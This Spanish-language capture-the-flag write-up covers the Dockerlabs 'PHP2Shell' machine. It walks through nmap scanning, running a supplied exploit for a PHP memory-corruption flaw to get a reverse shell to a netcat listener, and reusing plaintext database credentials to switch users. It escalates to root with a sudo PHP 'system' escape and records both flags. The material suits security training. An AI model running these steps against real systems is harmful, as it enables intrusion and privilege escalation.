# Writeup Oficial: PHP2Shell (Dockerlabs)

* **Máquina:** PHP2Shell
* **Dificultad:** Media
* **Sistema Operativo:** Linux (Ubuntu 22.04 LTS)
* **Vulnerabilidades:** CVE-2026-109618 & CVE-2026-109619 (PHP2Shell)
* **Objetivo:** Compromiso total del contenedor (User Flag + Root Flag)

---

## 1. Despliegue del Laboratorio

Desplegamos el laboratorio ejecutando el script oficial con privilegios de administrador:

```bash
sudo bash auto_deploy.sh
```

El script asigna la dirección IP estática `172.18.0.2` y configura automáticamente el dominio `php2shell.dl` en `/etc/hosts`.

---

## 2. Fase de Reconocimiento y Enumeración

### 2.1. Escaneo de Puertos con Nmap

Lanzamos un escaneo exhaustivo sobre los 65.535 puertos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts
```

Identificamos el puerto **80/TCP** abierto. Seguidamente, realizamos un escaneo de versiones y scripts de reconocimiento por defecto:

```bash
nmap -sCV -p80 172.18.0.2 -oN targeted
```

**Resultado:**
```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu) mod_php/8.2.18
|_http-title: PHP2Shell Cloud Platform - Enterprise Core
```

### 2.2. Enumeración Web

Accedemos mediante el navegador a `http://php2shell.dl`:

1. La página de inicio nos presenta una plataforma corporativa denominada *PHP2Shell Cloud Enterprise*.
2. En las cabeceras de respuesta HTTP y en el pie de página se expone la versión del motor:
   * **PHP Core Engine:** `8.2.18 (Zend Engine v4.2.18)`
   * **SAPI:** `Apache 2.0 Handler (mod_php)`
   * **OOM Handler:** `longjmp_native`

Consultamos el endpoint de diagnóstico expuesto:

```bash
curl -s http://php2shell.dl/api.php?action=diagnostic | jq .
```

```json
{
  "status": "online",
  "php_version": "8.2.18",
  "sapi_name": "apache2handler",
  "memory_limit": "128M",
  "oom_handler": "longjmp_native",
  "shared_state": "mod_php_pool"
}
```

---

## 3. Análisis de Vulnerabilidades (PHP2Shell)

Al investigar la versión de PHP detectada (`8.2.18`), identificamos que es vulnerable al conjunto de fallos críticos **PHP2Shell**:

1. **CVE-2026-109618:** Corrupción de memoria debida al manejo incorrecto de excepciones de memoria insuficiente (OOM) mediante llamadas a `longjmp()`.
2. **CVE-2026-109619:** Vulnerabilidad de Use-After-Free (UAF) donde el estado global de una petición sobrevive en el proceso worker de Apache y es reutilizado en peticiones subsiguientes sin reinicializar.

Dado que el servidor utiliza el módulo `mod_php` de Apache, las peticiones HTTP no autenticadas pueden manipular directamente el pool de memoria del proceso worker antes del aislamiento de capas de aplicación.

---

## 4. Explotación: RCE y Reverse Shell (www-data)

Utilizamos el script de explotación automatizado provisto en el laboratorio (`exploit/exploit_php2shell.py`).

### 4.1. Verificación de Ejecución Remota de Comandos

```bash
python3 exploit/exploit_php2shell.py -t http://php2shell.dl -c "id; uname -a"
```

**Salida:**
```text
[+] Objetivo alcanzable.
[+] Salida:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux php2shell 5.15.0 #1 SMP x86_64 GNU/Linux
```

### 4.2. Obtención de Reverse Shell

Ponemos un listener en nuestra máquina atacante:

```bash
nc -nlvp 4444
```

Lanzamos la Reverse Shell desde el exploit:

```bash
python3 exploit/exploit_php2shell.py -t http://php2shell.dl --lhost 172.18.0.1 --lport 4444
```

En nuestro listener recibimos la conexión como `www-data`. Estabilizamos la TTY:

```bash
script /dev/null -c bash
# Presionar Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

---

## 5. Movimiento Lateral: www-data -> mario

Enumeramos el directorio web `/var/www/`:

```bash
cd /var/www
ls -la
```

Encontramos un archivo de configuración de base de datos no público: `config_db.php`:

```bash
cat /var/www/config_db.php
```

```php
<?php
// Internal database & system management
$db_host = "127.0.0.1";
$db_user = "mario";
$db_pass = "chocolate";
$db_name = "corp_cloud";
?>
```

Revisamos `/etc/passwd` y confirmamos que existe el usuario local `mario`:

```bash
grep bash /etc/passwd
```

Probamos reutilización de credenciales migrando al usuario `mario` con la contraseña `chocolate`:

```bash
su - mario
# Introducir contraseña: chocolate
```

Comprobamos nuestra identidad y capturamos la primera flag:

```bash
whoami
# mario

cat /home/mario/user.txt
```

> **User Flag:** `dl{php2shell_uaf_00m_c0rrupti0n_9a2b}`

---

## 6. Escalada de Privilegios: mario -> root

Revisamos los privilegios `sudo` asignados al usuario `mario`:

```bash
sudo -l
```

**Salida:**
```text
Matching Defaults entries for mario on php2shell:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mario may run the following commands on php2shell:
    (root) NOPASSWD: /usr/bin/php
```

El usuario `mario` tiene permiso para ejecutar el binario `/usr/bin/php` como `root` sin contraseña. Siguiendo la técnica de **GTFOBins**:

```bash
sudo /usr/bin/php -r "system('/bin/bash');"
```

Confirmamos privilegios máximos:

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

Capturamos la flag final en el directorio del superusuario:

```bash
cat /root/root.txt
```

> **Root Flag:** `dl{php_c0re_3ng1n3_pwn3d_cve2026_x86}`

¡Máquina completada con éxito!
